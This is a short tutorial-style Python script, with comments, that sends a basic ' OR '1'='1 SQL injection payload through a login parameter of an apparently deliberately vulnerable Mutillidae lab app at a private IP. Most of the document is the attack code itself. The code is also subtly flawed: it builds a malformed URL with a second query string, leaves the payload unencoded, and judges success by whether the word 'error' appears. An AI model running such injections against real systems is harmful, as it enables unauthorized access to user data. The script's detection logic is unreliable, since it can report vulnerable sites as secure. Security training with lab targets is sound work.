
# Here's another example that demonstrates how to perform a basic SQL injection attack against a vulnerable web application using Python's `requests` library:

# Simple SQL Injection Attack

import requests

def perform_sql_injection(url, vulnerable_parameter):
    # SQL injection payload
    payload = f"' OR '1'='1"

    # Construct the URL with the payload
    target_url = f"{url}?{vulnerable_parameter}={payload}"

    # Send a GET request with the malicious payload
    response = requests.get(target_url)

    # Check if the response indicates a successful injection
    if "error" in response.text.lower():
        print("SQL Injection successful! The application is vulnerable.")
    else:
        print("SQL Injection unsuccessful. The application is likely secure.")

def main():
    # URL of the vulnerable web application
    vulnerable_url = "http://192.168.124.216/mutillidae/index.php?page=login.php"

    # Parameter vulnerable to SQL injection
    vulnerable_parameter = "username"

    print("Performing SQL Injection attack...")
    perform_sql_injection(vulnerable_url, vulnerable_parameter)

if __name__ == "__main__":
    main()

# We define a function `perform_sql_injection()` that takes the URL of a vulnerable web application and the name of a parameter vulnerable to SQL injection as input.
# We construct a SQL injection payload that will always evaluate to true (`' OR '1'='1`). This payload is appended to the URL as a query parameter.
# We send a GET request to the target URL with the malicious payload using the `requests.get()` function.
# We check if the response indicates a successful injection by searching for specific keywords like "error" in the response text.
# In the `main()` function, we specify the URL of the vulnerable web application and the vulnerable parameter, and then call the `perform_sql_injection()` function to execute the attack.
